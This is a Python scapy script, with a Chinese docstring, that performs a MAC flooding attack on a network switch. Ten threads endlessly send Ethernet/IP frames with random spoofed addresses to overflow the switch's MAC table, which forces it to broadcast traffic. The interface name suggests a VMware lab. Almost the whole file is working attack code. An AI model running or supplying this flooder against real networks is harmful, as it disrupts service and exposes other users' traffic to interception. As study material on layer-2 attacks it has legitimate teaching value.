import random,threading
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
'''
该代码用于实现mac地址的泛洪，发送到交换机，源mac,ip
目的mac,ip都是虚假的，交换机会将mac地址记录到对应端口
导致mac表过大无法记录，就会进行广播通信，一般的交换机
没有ip，只根据mac进行端口转发，对于路由器而言，解析顺序：
ip->决定下一跳-》封装下一跳mac
主机跟据mac地址来确定是否是自己的数据包，路由器根据ip跳转前
先要确定是自己的数据包，才进行下一步的处理
'''

def generate_random_mac():
    # MAC 地址由6个十六进制字节组成(0-255)
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]

    # 转换为十六进制字符串，并用冒号分隔
    return ':'.join(map(lambda x: "%02x" % x, mac))


def generate_random_ip():
    ip=f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
    return ip



def macfanhong():
    while True:
        randmacs=generate_random_mac()
        randmacd=generate_random_mac()
        randips=generate_random_ip()
        randipd=generate_random_ip()
        try:
            data=Ether(src=randmacs, dst=randmacd) / IP(src=randips, dst=randips)
            sendp(data,iface="VMware Network Adapter VMnet8",loop=0)
        except Exception as e:
            pass



if __name__ == '__main__':
    for i in range(10):
        threading.Thread(target=macfanhong).start()
